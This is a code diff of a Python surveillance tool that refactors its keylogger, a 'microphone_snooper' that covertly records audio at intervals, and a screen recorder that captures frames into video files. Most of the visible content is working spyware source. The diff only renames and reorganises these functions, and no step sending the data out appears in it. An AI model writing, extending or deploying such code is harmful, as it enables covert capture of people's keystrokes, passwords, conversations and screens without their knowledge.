@@ -38,7 +38,8 @@ def clean_up():
     files = glob.glob(TEMP+"*")
     for f in files:
         os.remove(f)
-    
+
+#KEYLOGGER #################################################################################################
 def clear_logs():
     logs = ""
     main_path = os.path.dirname(os.path.realpath(__file__))
@@ -46,34 +47,6 @@ def clear_logs():
     TEMP_PATH = f"{main_path}/resources/"
     with open(f"{TEMP_PATH}/log.txt", "wb") as f:
         pickle.dump(logs, f)  
-
-def microphone():
-    fs = MIC_SAMPLERATE
-    seconds = TIME_UPDATE_INTERVAL
-    myrecording = sounddevice.rec(int(seconds * fs), samplerate=fs, channels=2)
-    sounddevice.wait()
-    write(PATH + audio_information, fs, myrecording)
-
-def screenshot():
-    global TIME_UPDATE_INTERVAL, FPS
-
-    run = True
-
-    frame_buffer = []
-    frame_count = 0
-    mov_count = 0
-    while run:
-        frame = ImageGrab.grab()
-        frame_count += 1
-        frame.save(TEMP + screen_name+str(frame_count)+image_file_extension)
-
-        if frame_count > RECORDER_FRAME_LIMIT:
-            image_files = [TEMP+img for img in os.listdir(TEMP) if img.endswith(".png")]
-            clip = moviepy.video.io.ImageSequenceClip.ImageSequenceClip(image_files, fps=int(FPS))
-            clip.write_videofile(f"{PATH}screen{mov_count}.mp4")
-            mov_count += 1
-            frame_count = 0
-            clean_up()
 
 def on_press(key):
     global keys, count, current_time
@@ -83,7 +56,7 @@ def on_press(key):
     count += 1
     if count > INPUT_UPDATE_INTERVAL:
         write_file(keys)
-        count = 0
+        count = 0   
         keys = []
 
 def write_file(keys):
@@ -113,6 +86,8 @@ def keylogger():
         with Listener(on_press=on_press, on_release=on_release) as listener:
             listener.join()
 
+#KEYLOGGER #################################################################################################
+
 def microphone_snooper():
     global stopping_time, TIME_UPDATE_INTERVAL
     run = True
@@ -121,7 +96,31 @@ def microphone_snooper():
         if current_time > stopping_time:
             current_time = time.time()
             stopping_time = time.time() + TIME_UPDATE_INTERVAL
-            microphone()
+            fs = MIC_SAMPLERATE
+            seconds = TIME_UPDATE_INTERVAL
+            myrecording = sounddevice.rec(int(seconds * fs), samplerate=fs, channels=2)
+            sounddevice.wait()
+            write(PATH + audio_information, fs, myrecording)
+
+def screen_recorder():
+    global TIME_UPDATE_INTERVAL, FPS
+    run = True
+
+    frame_buffer = []
+    frame_count = 0
+    mov_count = 0
+    while run:
+        frame = ImageGrab.grab()
+        frame_count += 1
+        frame.save(TEMP + screen_name+str(frame_count)+image_file_extension)
+
+        if frame_count > RECORDER_FRAME_LIMIT:
+            image_files = [TEMP+img for img in os.listdir(TEMP) if img.endswith(".png")]
+            clip = moviepy.video.io.ImageSequenceClip.ImageSequenceClip(image_files, fps=int(FPS))
+            clip.write_videofile(f"{PATH}screen{mov_count}.mp4")
+            mov_count += 1
+            frame_count = 0
+            clean_up()
 
 if CLEAN_UP:
     clean_up()
@@ -134,4 +133,4 @@ if __name__ == '__main__':
     if MICROPHONE_SNOOPER_ENABLED:
         Thread(target = microphone_snooper).start()
     if SCREEN_RECORDER_ENABLED:
-        Thread(target = screenshot).start()
+        Thread(target = screen_recorder).start()
